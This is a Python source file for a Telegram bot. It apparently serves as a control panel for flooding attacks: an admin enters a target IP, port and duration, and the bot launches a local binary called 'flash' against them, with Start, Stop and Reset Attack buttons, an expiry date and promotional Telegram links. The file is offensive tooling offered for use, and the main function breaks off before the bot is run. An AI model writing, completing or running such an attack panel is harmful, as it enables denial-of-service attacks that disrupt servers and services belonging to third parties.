import subprocess
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from flashh import TOKEN  # Import the TOKEN variable

ADMIN_ID = 6135948216  # Your admin ID
EXPIRY_DATE = datetime(2024, 12, 31)  # Set the expiry date (Year, Month, Day)

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Path to your binary
BINARY_PATH = "./flash"

# Global variables
process = None
target_ip = None
target_port = None
attack_time = None

# Check if the user is admin
def is_admin(update: Update) -> bool:
    return update.effective_user.id == ADMIN_ID

# Check if the bot has expired
def is_expired() -> bool:
    """Check if the bot has expired."""
    return datetime.now() > EXPIRY_DATE

# Start command: Show Attack button (admin only)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.message.reply_text("This bot has expired. Contact the developer for assistance.")
        return

    if not is_admin(update):
        await update.message.reply_text("This bot is for admin use only.")
        return

    keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("By https://https://t.me/ULTRA_GAMER_OP1 🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)", reply_markup=reply_markup)

# Handle button clicks (admin only)
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.callback_query.message.reply_text("This bot has expired. Contact the developer for assistance.")
        await update.callback_query.answer()
        return

    if not is_admin(update):
        await update.callback_query.message.reply_text("This action is for admin use only.")
        await update.callback_query.answer()
        return

    await update.callback_query.answer()

    if update.callback_query.data == 'attack':
        await update.callback_query.message.reply_text("By https://t.me/ULTRA_GAMER_OP1 Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀")

# Handle target, port, and time input (admin only)
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.message.reply_text("This bot has expired. Contact the developer for assistance.")
        return

    if not is_admin(update):
        await update.message.reply_text("This bot is for admin use only.")
        return

    global target_ip, target_port, attack_time

    try:
        target, port, time = update.message.text.split()
        target_ip = target
        target_port = int(port)
        attack_time = int(time)

        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\n"
                                        "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text('Invalid format. Please enter in the format: <target> <port> <time>🚀🚀')

# Start the attack (admin only)
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.callback_query.message.reply_text("This bot has expired. Contact the developer for assistance.")
        return

    if not is_admin(update):
        await update.callback_query.message.reply_text("This action is for admin use only.")
        return

    global process, target_ip, target_port, attack_time
    if not target_ip or not target_port or not attack_time:
        await update.callback_query.message.reply_text("Please configure the target, port, and time first.")
        return

    if process and process.poll() is None:
        await update.callback_query.message.reply_text("Attack is already running.")
        return

    try:
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.callback_query.message.reply_text(f"CHIN TAPAK DUM DUM (●'◡'●) FeedBack De Dio Yaad se 😡 :- 👉 https://t.me/ULTRA_GAMER_OP1 {target_ip}:{target_port} for {attack_time} seconds https://t.me/ULTRA_GAMER_OP1")
    except Exception as e:
        await update.callback_query.message.reply_text(f"Error starting attack: {e}")
        logging.error(f"Error starting attack: {e}")

# Stop the attack (admin only)
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.callback_query.message.reply_text("This bot has expired. Contact the developer for assistance.")
        return

    if not is_admin(update):
        await update.callback_query.message.reply_text("This action is for admin use only.")
        return

    global process
    if not process or process.poll() is not None:
        await update.callback_query.message.reply_text("CHIN TAPAK DUM DUM NHI CHAL RHA (●'◡'●) https://t.me/ULTRA_GAMER_OP1 ")
        return

    process.terminate()
    process.wait()
    await update.callback_query.message.reply_text("Attack stopped.")

# Reset the attack (admin only)
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.callback_query.message.reply_text("This bot has expired. Contact the developer for assistance.")
        return

    if not is_admin(update):
        await update.callback_query.message.reply_text("This action is for admin use only.")
        return

    global process, target_ip, target_port, attack_time
    if process and process.poll() is None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    attack_time = None
    await update.callback_query.message.reply_text("Attack reset. By https://t.me/ULTRA_GAMER_OP1 Please enter the target, port, and time in the format:<target> <port> <time>🚀")

# Button action handler for start/stop/reset actions (admin only)
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_expired():
        await update.callback_query.message.reply_text("This bot has expired. Contact the developer for assistance.")
        return

    if not is_admin(update):
        await update.callback_query.message.reply_text("This action is for admin use only.")
        return

    query = update.callback_query
    await query.answer()

    if query.data == 'start_attack':
        await start_attack(update, context)
    elif query.data == 'stop_attack':
        await stop_attack(update, context)
    elif query.data == 'reset_attack':
        await reset_attack(update, context)

# Main function to start the bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register button handler
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))

    # Register message handler to handle input for target, port, and time
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))
